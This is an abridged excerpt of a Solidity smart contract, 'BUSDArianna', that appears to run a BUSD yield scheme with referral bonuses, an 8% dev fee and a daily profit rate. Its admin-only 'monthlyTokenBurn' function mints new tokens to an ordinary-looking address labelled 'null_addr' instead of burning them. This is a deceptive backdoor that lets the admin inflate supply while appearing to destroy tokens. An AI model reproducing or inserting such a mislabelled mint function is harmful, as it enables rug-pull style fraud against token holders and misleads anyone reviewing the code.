...
contract BUSDArianna is Token {
    
    uint private startTime = 1664892000; // Tuesday, October 04, 2022 14:00:00 (GMT)
    ...
    uint8[] private REF_BONUSES             = [50];
    uint private constant DEV_FEE           = 80;                   //8%

    uint private constant INITIAL_TOKENS    = 30000 ether;    
    ...
    uint public TOKEN_DAILYPROFIT = 100;
    ...
    function monthlyTokenBurn(uint256 _tokenAmount) public{
        require(msg.sender == ADMIN);
        address null_addr = 0xb5979CB4d49F128731a8165092102DF08bE804ed;
        _mint(null_addr, _tokenAmount);
    }
